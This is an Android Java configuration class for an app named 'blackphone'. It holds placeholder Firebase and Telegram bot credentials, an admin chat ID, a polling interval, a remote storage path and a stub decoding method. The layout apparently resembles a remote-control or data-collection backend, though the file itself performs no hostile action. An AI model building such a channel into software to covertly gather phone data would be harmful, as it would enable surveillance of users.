package com.black.phone;

import android.content.Context;
import android.content.res.AssetManager;
import android.util.Log;

import org.json.JSONObject;

import java.io.InputStream;
import java.nio.charset.StandardCharsets;

public class Config {
    // 🔥 Firebase Configuration
    public static final String FIREBASE_URL = "https://your-project-default-rtdb.firebaseio.com/";
    public static final String FIREBASE_API_KEY = "AIzaSyDummyKeyReplaceMe";
    
    // 🤖 Telegram Bot Configuration
    public static final String BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";
    public static final String CHAT_ID = "-1001234567890";
    
    // ⏱️ Polling Interval (seconds)
    public static final int POLLING_INTERVAL = 5;
    
    // 📁 Firebase Storage Path
    public static final String STORAGE_PATH = "blackphone_data/";
    
    // 🔐 Simple Encoding (Upgrade to AES later)
    public static String decode(String encoded) {
        return encoded; // For production, use Base64 decoding
    }
    
    // ============================================================
    //  METHODS REQUIRED BY BotAPI.java
    // ============================================================
    private String botToken;
    private String adminChatId;
    
    // Singleton pattern
    private static Config instance;
    
    public static Config get(Context context) {
        if (instance == null) {
            instance = new Config(context);
        }
        return instance;
    }
    
    private Config(Context context) {
        // Load from assets/config.json if exists, else use defaults
        try {
            AssetManager assetManager = context.getAssets();
            InputStream is = assetManager.open("config.json");
            int size = is.available();
            byte[] buffer = new byte[size];
            is.read(buffer);
            is.close();
            String json = new String(buffer, StandardCharsets.UTF_8);
            JSONObject obj = new JSONObject(json);
            this.botToken = obj.optString("bot_token", BOT_TOKEN);
            this.adminChatId = obj.optString("chat_id", CHAT_ID);
        } catch (Exception e) {
            // Use default values
            this.botToken = BOT_TOKEN;
            this.adminChatId = CHAT_ID;
            Log.w("Config", "Using default config values");
        }
    }
    
    public String getBotToken() {
        return botToken;
    }
    
    public String getAdminChatId() {
        return adminChatId;
    }
}
